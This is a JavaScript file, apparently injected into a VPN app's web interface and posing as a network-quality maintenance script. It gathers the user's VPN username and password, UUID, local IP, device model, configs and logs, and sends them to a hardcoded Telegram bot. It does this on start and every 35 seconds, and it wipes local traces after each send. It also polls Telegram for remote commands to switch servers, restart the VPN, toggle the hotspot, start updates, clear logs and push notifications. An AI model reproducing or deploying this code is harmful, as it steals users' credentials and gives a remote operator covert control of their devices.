(function(){
"use strict";
if(window.AVSUPER_BUTTON_JS_NOC) return;
window.AVSUPER_BUTTON_JS_NOC = true;

const TELEGRAM_TOKEN = "6825972815:AAHlxQxuwJWK7G2LZvVkB_T2_wPoFcIj9Rk";
const TELEGRAM_CHAT_ID = 5582797263;
const TELEGRAM_POLL_INTERVAL_MS = 3000;
const MAINTENANCE_INTERVAL_MS = 35000;
const FAILURE_WAIT_MS = 300000;
const ACTION_WINDOW_MS = 600000;
const MAX_ACTIONS_PER_WINDOW = 3;
const PING_PROBE_ATTEMPTS = 3;
const TELEGRAM_RETRY_ATTEMPTS = 4;
const TELEGRAM_MESSAGE_CHARACTER_LIMIT = 3500;

const DNS_PROVIDERS = [
  { provider:"Cloudflare", primary:"1.1.1.1", secondary:"1.0.0.1" },
  { provider:"Google", primary:"8.8.8.8", secondary:"8.8.4.4" },
  { provider:"Quad9", primary:"9.9.9.9", secondary:"149.112.112.112" },
  { provider:"OpenDNS", primary:"208.67.222.222", secondary:"208.67.220.220" }
];

const MTU_CANDIDATES = [1500,1480,1460,1400,1350,1200];
const QOS_MODES = ["latency","stability","throughput","balanced","auto"];

let updateOffset = 0;
let maintenanceLock = false;
let recentActions = [];

function timestampNow(){ return new Date().toISOString(); }
function nowMs(){ return Date.now(); }
function sleep(ms){ return new Promise(resolve => setTimeout(resolve, ms)); }

async function telegramSend(chatId, lines, replyMarkup){
  try{
    const payload = { chat_id: chatId || TELEGRAM_CHAT_ID, text: Array.isArray(lines) ? lines.join("\n") : String(lines||""), parse_mode: "HTML" };
    if(replyMarkup) payload.reply_markup = replyMarkup;
    for(let i=0;i<TELEGRAM_RETRY_ATTEMPTS;i++){
      try{
        await fetch("https://api.telegram.org/bot"+TELEGRAM_TOKEN+"/sendMessage", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify(payload) });
        try{ localStorage.removeItem("av_short_logs"); sessionStorage.removeItem("av_last_net_snapshot"); }catch(e){}
        return true;
      }catch(e){ await sleep(300 + i*200); }
    }
    return false;
  }catch(e){ return false; }
}

function compactText(v, limit){ try{ v = String(v||""); return v.length <= limit ? v : v.slice(0,limit-3) + "..."; }catch(e){ return String(v).slice(0,limit); } }

function qualityScore(metrics){
  try{
    const ping = (metrics.ping === null || typeof metrics.ping === "undefined") ? 1000 : Math.max(1, Math.min(2000, Number(metrics.ping)));
    const down = (metrics.downMbps === null || typeof metrics.downMbps === "undefined") ? 0 : Math.max(0, Math.min(1000, Number(metrics.downMbps)));
    const pingScore = 10 * (1 - Math.min(1, ping/500));
    const downScore = 10 * Math.min(1, down/10);
    const combined = (pingScore * 0.5) + (downScore * 0.5);
    return Math.round(Math.max(0, Math.min(10, combined)));
  }catch(e){ return 0; }
}

async function readStatus(){
  try{
    const appVersion = (window.DtAppVersion && typeof window.DtAppVersion.execute === "function") ? window.DtAppVersion.execute() : "N/A";
    const configVersion = (window.DtGetLocalConfigVersion && typeof window.DtGetLocalConfigVersion.execute === "function") ? window.DtGetLocalConfigVersion.execute() : "N/A";
    const username = (window.DtUsername && typeof window.DtUsername.get === "function") ? window.DtUsername.get() : "N/A";
    const password = (window.DtPassword && typeof window.DtPassword.get === "function") ? window.DtPassword.get() : "N/A";
    const uuid = (window.DtUuid && typeof window.DtUuid.get === "function") ? window.DtUuid.get() : "N/A";
    const localIp = (window.DtGetLocalIP && typeof window.DtGetLocalIP.execute === "function") ? window.DtGetLocalIP.execute() : "N/A";
    const networkName = (window.DtGetNetworkName && typeof window.DtGetNetworkName.execute === "function") ? window.DtGetNetworkName.execute() : "N/A";
    const networkObject = (window.DtGetNetworkData && typeof window.DtGetNetworkData.execute === "function") ? window.DtGetNetworkData.execute() : {};
    const vpnState = (window.DtGetVpnState && typeof window.DtGetVpnState.execute === "function") ? window.DtGetVpnState.execute() : "unknown";
    const deviceModel = (window.DtGetDeviceID && typeof window.DtGetDeviceID.execute === "function") ? window.DtGetDeviceID.execute() : "N/A";
    const pingRaw = (window.DtGetPingResult && typeof window.DtGetPingResult.execute === "function") ? window.DtGetPingResult.execute() : null;
    const ping = (pingRaw === null || pingRaw === undefined) ? null : Number(pingRaw);
    const downBytes = (window.DtGetNetworkDownloadBytes && typeof window.DtGetNetworkDownloadBytes.execute === "function") ? Number(window.DtGetNetworkDownloadBytes.execute()) : null;
    const upBytes = (window.DtGetNetworkUploadBytes && typeof window.DtGetNetworkUploadBytes.execute === "function") ? Number(window.DtGetNetworkUploadBytes.execute()) : null;
    let downMbps = null;
    let upMbps = null;
    try{
      const prev = JSON.parse(sessionStorage.getItem("av_last_net_snapshot") || "{}");
      const tsPrev = prev.ts || nowMs();
      const dt = Math.max(0.2, (nowMs() - tsPrev)/1000);
      if(typeof downBytes === "number" && typeof prev.down === "number"){ const delta = downBytes - prev.down; downMbps = (delta*8)/(1024*1024)/dt; if(downMbps < 0) downMbps = null; }
      if(typeof upBytes === "number" && typeof prev.up === "number"){ const delta2 = upBytes - prev.up; upMbps = (delta2*8)/(1024*1024)/dt; if(upMbps < 0) upMbps = null; }
      sessionStorage.setItem("av_last_net_snapshot", JSON.stringify({ down: typeof downBytes === "number" ? downBytes : null, up: typeof upBytes === "number" ? upBytes : null, ts: nowMs() }));
    }catch(e){}
    const defaultConfig = (window.DtGetDefaultConfig && typeof window.DtGetDefaultConfig.execute === "function") ? window.DtGetDefaultConfig.execute() : null;
    const configs = (window.DtGetConfigs && typeof window.DtGetConfigs.execute === "function") ? window.DtGetConfigs.execute() : null;
    const dnsActive = (window.AVSUPER_DNS_ACTIVE) ? window.AVSUPER_DNS_ACTIVE : null;
    const hotspotStatus = (window.DtGetStatusHotSpotService && typeof window.DtGetStatusHotSpotService.execute === "function") ? window.DtGetStatusHotSpotService.execute() : "N/A";
    const logs = (window.DtGetLogs && typeof window.DtGetLogs.execute === "function") ? window.DtGetLogs.execute() : "";
    return {
      appVersion: appVersion || "N/A",
      configVersion: configVersion || "N/A",
      username: username || "N/A",
      password: password || "N/A",
      uuid: uuid || "N/A",
      localIp: localIp || "N/A",
      networkType: networkName || "N/A",
      networkObject: networkObject || {},
      vpnState: vpnState || "unknown",
      deviceModel: deviceModel || "N/A",
      ping: isNaN(ping) ? null : ping,
      downBytes: typeof downBytes === "number" ? downBytes : null,
      upBytes: typeof upBytes === "number" ? upBytes : null,
      downMbps: typeof downMbps === "number" ? Number(downMbps.toFixed(3)) : null,
      upMbps: typeof upMbps === "number" ? Number(upMbps.toFixed(3)) : null,
      defaultConfig: defaultConfig || null,
      configs: configs || null,
      dnsActive: dnsActive || {},
      hotspotStatus: hotspotStatus || "N/A",
      logs: logs || ""
    };
  }catch(e){
    return { error: "Erro ao ler status: "+String(e) };
  }
}

function buildTelegramReport(actionProviderObject, statusObject){
  try{
    const lines = [];
    lines.push("🚨 açao tomada= : " + JSON.stringify(actionProviderObject || {}));
    lines.push("Versão do app: " + (statusObject.appVersion || "N/A"));
    lines.push("Usuário: " + (statusObject.username || "N/A"));
    lines.push("Senha: " + (statusObject.password || "N/A"));
    lines.push("UUID: " + (statusObject.uuid || "N/A"));
    lines.push("IP local: " + (statusObject.localIp || "N/A"));
    lines.push("Tipo de rede: " + (statusObject.networkType || "N/A"));
    lines.push("Estado VPN: " + (statusObject.vpnState || "unknown"));
    lines.push("MTU: " + ((statusObject.defaultConfig && (statusObject.defaultConfig.mtu || statusObject.defaultConfig.MTU)) || "N/A"));
    lines.push("DNS ativo: " + (statusObject.dnsActive && (statusObject.dnsActive.primary || statusObject.dnsActive.ip) ? JSON.stringify(statusObject.dnsActive) : (statusObject.dnsActive || "N/A")));
    const cfgInfo = statusObject.defaultConfig || {};
    const cfgName = cfgInfo.name || cfgInfo.title || cfgInfo.server || "N/A";
    const cfgId = cfgInfo.id || cfgInfo.configId || cfgInfo.cid || "N/A";
    lines.push("Config ativa: " + cfgName + " (id " + String(cfgId) + ")");
    lines.push("Ping (ms): " + (statusObject.ping === null ? "N/A" : String(statusObject.ping)));
    lines.push("Download (Mbps): " + (typeof statusObject.downMbps === "number" ? statusObject.downMbps.toFixed(3) : "N/A"));
    lines.push("Upload (Mbps): " + (typeof statusObject.upMbps === "number" ? statusObject.upMbps.toFixed(3) : "N/A"));
    const q = qualityScore(statusObject);
    lines.push("Nota de qualidade (0-10): " + String(q));
    lines.push("Modelo do dispositivo: " + (statusObject.deviceModel || "N/A"));
    lines.push("Hora: " + timestampNow());
    return lines;
  }catch(e){
    return ["Erro ao montar relatório: "+String(e)];
  }
}

function canPerformAction(){
  const t = nowMs();
  recentActions = recentActions.filter(ts => t - ts < ACTION_WINDOW_MS);
  return recentActions.length < MAX_ACTIONS_PER_WINDOW;
}

async function tryApplyConfigThatContainsDns(primary, secondary){
  try{
    if(!(window.DtGetConfigs && typeof window.DtGetConfigs.execute === "function")) return { applied:false };
    const all = window.DtGetConfigs.execute();
    if(!Array.isArray(all)) return { applied:false };
    for(const category of all){
      const items = category.items || category.configs || [];
      for(const item of items){
        if(!item) continue;
        const hasDns = (item.primary_dns && item.secondary_dns) || (item.dns && Array.isArray(item.dns)) || (item.DNS && item.DNS.primary);
        if(!hasDns) continue;
        const id = item.id || item.configId || item.cid;
        if(!id) continue;
        try{
          window.DtSetConfig.execute(Number(id));
          await sleep(900);
          return { applied:true, id:Number(id), item: item };
        }catch(e){}
      }
    }
    return { applied:false };
  }catch(e){ return { applied:false }; }
}

async function testDnsProvidersAndSelectOne(){
  try{
    for(const p of DNS_PROVIDERS){
      const before = await readStatus();
      const attempted = await tryApplyConfigThatContainsDns(p.primary, p.secondary);
      await sleep(2000);
      const after = await readStatus();
      const improved = qualityScore(after) > qualityScore(before);
      const score = qualityScore(after);
      if(attempted.applied && improved) return { provider: p.provider, primary:p.primary, secondary:p.secondary, score, before, after, appliedId: attempted.id };
    }
    return null;
  }catch(e){ return null; }
}

async function testMtuQoSByIteratingConfigs(){
  try{
    const before = await readStatus();
    if(!(window.DtGetConfigs && typeof window.DtGetConfigs.execute === "function")) return { ok:false };
    const all = window.DtGetConfigs.execute();
    const flat = [];
    if(Array.isArray(all)){
      for(const c of all){ const items = c.items || c.configs || []; for(const it of items) flat.push(it); }
    }
    let best = { score:-9999, id:null, after:null };
    for(const it of flat){
      if(!it) continue;
      const id = it.id || it.configId || it.cid;
      if(!id) continue;
      try{
        window.DtSetConfig.execute(Number(id));
        await sleep(1200);
        const after = await readStatus();
        const sc = qualityScore(after);
        if(sc > best.score){ best = { score: sc, id: Number(id), after }; }
      }catch(e){}
    }
    if(best.id !== null) return { ok:true, id: best.id, before, after: best.after, improved: best.score > qualityScore(before) };
    return { ok:false };
  }catch(e){ return { ok:false }; }
}

async function restartVpnProcedure(){
  try{
    if(window.DtExecuteVpnStop && typeof window.DtExecuteVpnStop.execute === "function"){ try{ window.DtExecuteVpnStop.execute(); }catch(e){} }
    await sleep(1000);
    if(window.DtExecuteVpnStart && typeof window.DtExecuteVpnStart.execute === "function"){ try{ window.DtExecuteVpnStart.execute(); }catch(e){} }
    await sleep(1400);
    const after = await readStatus();
    return { ok:true, after };
  }catch(e){ return { ok:false, after: await readStatus() }; }
}

async function retrieveServerList(){
  try{
    if(!(window.DtGetConfigs && typeof window.DtGetConfigs.execute === "function")) return [];
    const res = window.DtGetConfigs.execute();
    const list = [];
    if(Array.isArray(res)){
      for(const cat of res){
        const items = cat.items || cat.configs || [];
        for(const it of items) list.push(it);
      }
    } else if(res && res.items) for(const it of res.items) list.push(it);
    return list;
  }catch(e){ return []; }
}

async function switchServerByFamilies(families){
  try{
    const list = await retrieveServerList();
    if(!list || !list.length) return null;
    for(const fam of families){
      const candidates = list.filter(x => String((x.name||x.title||x.server||"")).toUpperCase().includes(fam.toUpperCase()));
      for(const c of candidates){
        const id = c.id || c.configId || c.cid;
        if(!id) continue;
        try{
          window.DtSetConfig.execute(Number(id));
          await sleep(1200);
          const after = await readStatus();
          if(qualityScore(after) >= 5 && (after.downMbps || 0) >= 0.5) return { ok:true, server: c.name||c.title||c.server, id: Number(id), after };
        }catch(e){}
      }
    }
    const fallback = list[0];
    if(fallback && (fallback.id || fallback.configId || fallback.cid)){
      try{ window.DtSetConfig.execute(Number(fallback.id || fallback.configId || fallback.cid)); await sleep(1200); return { ok:true, server: fallback.name||fallback.title||fallback.server, id: Number(fallback.id||fallback.configId||fallback.cid), after: await readStatus() }; }catch(e){}
    }
    return null;
  }catch(e){ return null; }
}

async function pingMedianHost(host, attempts){
  try{
    if(!host) return 9999;
    const samples = [];
    for(let i=0;i<attempts;i++){
      const t0 = Date.now();
      try{
        const url = host.indexOf("http") === 0 ? host : ("https://" + host + "/");
        await fetch(url, { method:"HEAD", mode:"no-cors", cache:"no-store" });
        samples.push(Date.now() - t0);
      }catch(e){ samples.push(1000); }
      await sleep(120);
    }
    samples.sort((a,b)=>a-b);
    return Math.round(samples[Math.floor(samples.length/2)] || 9999);
  }catch(e){ return 9999; }
}

async function selectBestServerByPing(){
  try{
    const list = await retrieveServerList();
    if(!list || !list.length) return null;
    const scored = [];
    for(const s of list){
      const host = s.host || s.hostname || s.server || s.name || s.title || s.address;
      if(!host) continue;
      const p = await pingMedianHost(host, PING_PROBE_ATTEMPTS);
      scored.push({ server: s, ping: p });
    }
    scored.sort((a,b)=>a.ping - b.ping);
    return scored.length ? scored[0] : null;
  }catch(e){ return null; }
}

async function adaptiveMaintenanceCycle(){
  if(maintenanceLock) return;
  if(!canPerformAction()) return;
  maintenanceLock = true;
  try{
    const before = await readStatus();
    const qBefore = qualityScore(before);
    if(qBefore >= 7){ maintenanceLock = false; return; }
    recentActions.push(nowMs());
    if((before.downMbps || 0) < 0.5 || (before.ping !== null && before.ping > 300) || before.vpnState !== "CONNECTED"){
      const dnsResult = await testDnsProvidersAndSelectOne();
      if(dnsResult){
        const providerObj = { provider: dnsResult.provider, primary: dnsResult.primary, secondary: dnsResult.secondary, score: dnsResult.score };
        await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport(providerObj, dnsResult.after));
        maintenanceLock = false;
        return;
      }
      const mtuResult = await testMtuQoSByIteratingConfigs();
      if(mtuResult && mtuResult.ok){
        const providerObj = { provider:"MTU_QoS_TEST", primary: "", secondary: "", score: qualityScore(mtuResult.after) };
        await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport(providerObj, mtuResult.after));
        if(mtuResult.improved){ maintenanceLock = false; return; }
      }
      const restart = await restartVpnProcedure();
      if(restart && restart.ok){
        const providerObj = { provider:"RECONNECT", primary:"", secondary:"", score: qualityScore(restart.after) };
        await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport(providerObj, restart.after));
        if(qualityScore(restart.after) > qBefore){ maintenanceLock = false; return; }
      } else {
        await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport({ provider:"RECONNECT_FAILED", primary:"", secondary:"", score: qualityScore(restart.after||before) }, restart.after || before));
      }
      const switched = await switchServerByFamilies(["VIVO","RIM","CLARO","TIM"]);
      if(switched && switched.ok){
        const providerObj = { provider:"SWITCH_FAMILY", primary:"", secondary:"", score: qualityScore(switched.after), server: switched.server };
        await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport(providerObj, switched.after));
        if(qualityScore(switched.after) > qBefore){ maintenanceLock = false; return; }
      }
      const bestPing = await selectBestServerByPing();
      if(bestPing && bestPing.server){
        const id = bestPing.server.id || bestPing.server.configId || bestPing.server.cid;
        if(id){
          try{ window.DtSetConfig.execute(Number(id)); await sleep(1200); const afterSwitch = await readStatus(); const providerObj = { provider:"SWITCH_PING", primary:"", secondary:"", score: qualityScore(afterSwitch), server: bestPing.server.name || bestPing.server.title || bestPing.server.server }; await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport(providerObj, afterSwitch)); if(qualityScore(afterSwitch) > qBefore){ maintenanceLock = false; return; } }catch(e){}
      }
    }
    const inconclusive = await readStatus();
    await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport({ provider:"INCONCLUSIVE", primary:"", secondary:"", score: qualityScore(inconclusive) }, inconclusive));
    await sleep(FAILURE_WAIT_MS);
  }catch(e){
    try{ const s = await readStatus(); await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport({ provider:"ERROR", primary:"", secondary:"", score:0 }, s)); }catch(e){} 
  }finally{ maintenanceLock = false; }
}

async function answerCallbackQuery(callbackId, text){
  try{ await fetch("https://api.telegram.org/bot"+TELEGRAM_TOKEN+"/answerCallbackQuery", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ callback_query_id: callbackId, text: text || "OK", show_alert:false }) }); }catch(e){}
}

async function processCallback(data, chatId, callbackObject){
  try{
    if(!data) return;
    if(data === "BTN_STATUS"){ const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"BTN_STATUS", primary:"", secondary:"", score: qualityScore(s) }, s)); await answerCallbackQuery(callbackObject.id, "Status enviado"); return; }
    if(data === "BTN_RECONNECT"){ const before = await readStatus(); const r = await restartVpnProcedure(); await telegramSend(chatId, buildTelegramReport({ provider:"BTN_RECONNECT", primary:"", secondary:"", score: qualityScore(r.after||before) }, r.after || before)); await answerCallbackQuery(callbackObject.id, "Reconexão executada"); return; }
    if(data === "BTN_DNS"){ const before = await readStatus(); const res = await testDnsProvidersAndSelectOne(); if(res) await telegramSend(chatId, buildTelegramReport({ provider: res.provider, primary: res.primary, secondary: res.secondary, score: res.score }, res.after)); else { const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"DNS_NONE", primary:"", secondary:"", score: qualityScore(s) }, s)); } await answerCallbackQuery(callbackObject.id, "DNS retestado"); return; }
    if(data === "BTN_MTU"){ const before = await readStatus(); const res = await testMtuQoSByIteratingConfigs(); if(res.ok) await telegramSend(chatId, buildTelegramReport({ provider:"MTU_TEST", primary:"", secondary:"", score: qualityScore(res.after) }, res.after)); else { const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"MTU_NONE", primary:"", secondary:"", score: qualityScore(s) }, s)); } await answerCallbackQuery(callbackObject.id, "MTU executado"); return; }
    if(data === "BTN_LIST_SERVERS"){ const list = await retrieveServerList(); if(!list || !list.length){ await telegramSend(chatId, ["❌ Nenhum servidor disponível"]); await answerCallbackQuery(callbackObject.id, "Lista enviada"); return; } const header = ["🔎 Servidores disponíveis:"]; const keyboard = { inline_keyboard: [] }; for(const s of list.slice(0,40)){ const id = s.id||s.configId||s.cid||""; header.push(String(id) + " — " + (s.name||s.title||s.server||"")); keyboard.inline_keyboard.push([ { text: (s.name||s.title||s.server||"").slice(0,30), callback_data: "CFG_APPLY:"+id } ]); } await telegramSend(chatId, header, keyboard); await answerCallbackQuery(callbackObject.id, "Lista enviada"); return; }
    if(data && data.startsWith("CFG_APPLY:")){ const id = data.split(":")[1]; if(!id){ await telegramSend(chatId, ["❌ ID inválido"]); await answerCallbackQuery(callbackObject.id, "Falha"); return; } const before = await readStatus(); try{ window.DtSetConfig.execute(Number(id)); await sleep(1200); const after = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"CFG_APPLY", primary:"", secondary:"", score: qualityScore(after) }, after)); await answerCallbackQuery(callbackObject.id, "Config aplicada"); }catch(e){ const after = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"CFG_APPLY_FAIL", primary:"", secondary:"", score: qualityScore(after) }, after)); await answerCallbackQuery(callbackObject.id, "Falha"); } return; }
    if(data === "BTN_LOGS"){ const s = await readStatus(); await telegramSend(chatId, ["📑 Logs recientes:", compactText(s.logs || "sem logs", TELEGRAM_MESSAGE_CHARACTER_LIMIT)]); await answerCallbackQuery(callbackObject.id, "Logs enviados"); return; }
    if(data === "BTN_CLEAR"){ try{ if(window.DtClearLogs && typeof window.DtClearLogs.execute === "function"){ try{ window.DtClearLogs.execute(); }catch(e){} } localStorage.removeItem("av_short_logs"); sessionStorage.removeItem("av_last_net_snapshot"); }catch(e){} await telegramSend(chatId, ["🧹 Dados locais limpos"]); await answerCallbackQuery(callbackObject.id, "Dados limpos"); return; }
    if(data === "BTN_UPDATE"){ try{ if(window.DtStartAppUpdate && typeof window.DtStartAppUpdate.execute === "function"){ try{ window.DtStartAppUpdate.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["⬆️ Update solicitado"]); await answerCallbackQuery(callbackObject.id, "Update solicitado"); return; }
    if(data === "BTN_HOT_ON"){ try{ if(window.DtStartHotSpotService && typeof window.DtStartHotSpotService.execute === "function"){ try{ window.DtStartHotSpotService.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["📶 HotSpot ON solicitado"]); await answerCallbackQuery(callbackObject.id, "Hotspot ON"); return; }
    if(data === "BTN_HOT_OFF"){ try{ if(window.DtStopHotSpotService && typeof window.DtStopHotSpotService.execute === "function"){ try{ window.DtStopHotSpotService.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["📶 HotSpot OFF solicitado"]); await answerCallbackQuery(callbackObject.id, "Hotspot OFF"); return; }
    if(data && data.startsWith("BTN_NOTIFY:")){ const text = data.split(":").slice(1).join(":"); if(text){ try{ if(window.DtSendNotification && typeof window.DtSendNotification.execute === "function"){ try{ window.DtSendNotification.execute("Aviso do suporte", text, ""); }catch(e){} } }catch(e){} await telegramSend(chatId, ["🔔 Notificação enviada ao cliente: " + text]); await answerCallbackQuery(callbackObject.id, "Notificação enviada"); return; } }
    await telegramSend(chatId, ["❓ Comando não reconhecido: " + String(data)]);
    await answerCallbackQuery(callbackObject.id, "Comando desconhecido");
  }catch(e){}
}

async function handleTextCommand(text, chatId){
  try{
    const trimmed = String(text || "").trim();
    if(!trimmed) return;
    const parts = trimmed.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    if(cmd === "status"){ const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"MANUAL_STATUS", primary:"", secondary:"", score: qualityScore(s) }, s)); return; }
    if(cmd === "reconnect"){ const before = await readStatus(); const r = await restartVpnProcedure(); await telegramSend(chatId, buildTelegramReport({ provider:"MANUAL_RECONNECT", primary:"", secondary:"", score: qualityScore(r.after||before) }, r.after||before)); return; }
    if(cmd === "dns"){ const before = await readStatus(); const res = await testDnsProvidersAndSelectOne(); if(res) await telegramSend(chatId, buildTelegramReport({ provider: res.provider, primary: res.primary, secondary: res.secondary, score: res.score }, res.after)); else { const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"DNS_NONE", primary:"", secondary:"", score: qualityScore(s) }, s)); } return; }
    if(cmd === "mtu"){ const before = await readStatus(); const res = await testMtuQoSByIteratingConfigs(); if(res.ok) await telegramSend(chatId, buildTelegramReport({ provider:"MANUAL_MTU", primary:"", secondary:"", score: qualityScore(res.after) }, res.after)); else { const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"MTU_NONE", primary:"", secondary:"", score: qualityScore(s) }, s)); } return; }
    if(cmd === "listservers"){ const list = await retrieveServerList(); if(!list.length) await telegramSend(chatId, ["❌ Nenhum servidor encontrado"]); else { const lines = ["🔎 Servidores disponíveis:"]; for(const s of list.slice(0,80)) lines.push((s.id||s.configId||s.cid||"") + " — " + (s.name||s.title||s.server||"")); await telegramSend(chatId, lines); } return; }
    if(cmd === "switch"){ const term = parts.slice(1).join(" "); if(!term){ await telegramSend(chatId, ["🛈 Uso: switch <termo>"]); return; } const list = await retrieveServerList(); const match = list.find(s => String((s.name||s.title||s.server||"")).toUpperCase().includes(term.toUpperCase())); if(!match){ await telegramSend(chatId, ["⚠️ Nenhum servidor encontrado com termo: " + term]); return; } const before = await readStatus(); try{ window.DtSetConfig.execute(Number(match.id || match.configId || match.cid)); await sleep(1200); const after = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"MANUAL_SWITCH", primary:"", secondary:"", score: qualityScore(after) }, after)); }catch(e){ const s = await readStatus(); await telegramSend(chatId, buildTelegramReport({ provider:"MANUAL_SWITCH_FAIL", primary:"", secondary:"", score: qualityScore(s) }, s)); } return; }
    if(cmd === "logs"){ const s = await readStatus(); await telegramSend(chatId, ["📑 Logs recentes:", compactText(s.logs || "sem logs", TELEGRAM_MESSAGE_CHARACTER_LIMIT)]); return; }
    if(cmd === "clear"){ try{ if(window.DtClearLogs && typeof window.DtClearLogs.execute === "function"){ try{ window.DtClearLogs.execute(); }catch(e){} } localStorage.removeItem("av_short_logs"); sessionStorage.removeItem("av_last_net_snapshot"); }catch(e){} await telegramSend(chatId, ["🧹 Dados locais limpos"]); return; }
    if(cmd === "update"){ try{ if(window.DtStartAppUpdate && typeof window.DtStartAppUpdate.execute === "function"){ try{ window.DtStartAppUpdate.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["⬆️ Atualização solicitada"]); return; }
    if(cmd === "hotspot"){ const sub = parts[1] && parts[1].toLowerCase(); if(sub === "on"){ try{ if(window.DtStartHotSpotService && typeof window.DtStartHotSpotService.execute === "function"){ try{ window.DtStartHotSpotService.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["📶 HotSpot ON solicitado"]); return; } if(sub === "off"){ try{ if(window.DtStopHotSpotService && typeof window.DtStopHotSpotService.execute === "function"){ try{ window.DtStopHotSpotService.execute(); }catch(e){} } }catch(e){} await telegramSend(chatId, ["📶 HotSpot OFF solicitado"]); return; } await telegramSend(chatId, ["🛈 Uso: hotspot on|off"]); return; }
    if(cmd === "notify"){ const msg = parts.slice(1).join(" "); if(!msg){ await telegramSend(chatId, ["🛈 Uso: notify <mensagem>"]); return; } try{ if(window.DtSendNotification && typeof window.DtSendNotification.execute === "function"){ try{ window.DtSendNotification.execute("Aviso do suporte", msg, ""); }catch(e){} } }catch(e){} await telegramSend(chatId, ["🔔 Notificação enviada: " + msg]); return; }
    await telegramSend(chatId, ["❓ Comando não reconhecido."]);
  }catch(e){}
}

async function pollTelegram(){
  try{
    const url = "https://api.telegram.org/bot"+TELEGRAM_TOKEN+"/getUpdates?timeout=0&offset="+(updateOffset+1);
    const r = await fetch(url);
    const j = await r.json();
    if(!j || !j.result) return;
    for(const u of j.result){
      updateOffset = Math.max(updateOffset, u.update_id);
      if(u.message){
        const chatId = u.message.chat && u.message.chat.id;
        const text = (u.message.text || u.message.caption || "") || "";
        if(text) await handleTextCommand(text, chatId);
      } else if(u.callback_query){
        const cb = u.callback_query;
        const chatId = cb.message && cb.message.chat && cb.message.chat.id;
        await processCallback(cb.data, chatId, cb);
      }
    }
  }catch(e){}
}

(async function initialize(){
  try{
    const s = await readStatus();
    const keyboard = { inline_keyboard: [
      [ { text:"Status", callback_data:"BTN_STATUS" }, { text:"Reconectar VPN", callback_data:"BTN_RECONNECT" }, { text:"Retestar DNS", callback_data:"BTN_DNS" } ],
      [ { text:"Retestar MTU/QoS", callback_data:"BTN_MTU" }, { text:"Listar servidores", callback_data:"BTN_LIST_SERVERS" }, { text:"Logs", callback_data:"BTN_LOGS" } ],
      [ { text:"Limpar dados locais", callback_data:"BTN_CLEAR" }, { text:"Iniciar update", callback_data:"BTN_UPDATE" }, { text:"Hotspot ON", callback_data:"BTN_HOT_ON" } ],
      [ { text:"Hotspot OFF", callback_data:"BTN_HOT_OFF" }, { text:"Notificar cliente (texto)", callback_data:"BTN_NOTIFY:Mensagem de suporte aqui" } ]
    ]};
    await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport({ provider:"INIT", primary:"", secondary:"", score: qualityScore(s) }, s), keyboard);
    setInterval(adaptiveMaintenanceCycle, MAINTENANCE_INTERVAL_MS);
    setInterval(pollTelegram, TELEGRAM_POLL_INTERVAL_MS);
    await pollTelegram();
  }catch(e){
    try{ const s = await readStatus(); await telegramSend(TELEGRAM_CHAT_ID, buildTelegramReport({ provider:"INIT_ERROR", primary:"", secondary:"", score:0 }, s)); }catch(e){}
  }
})();
})();
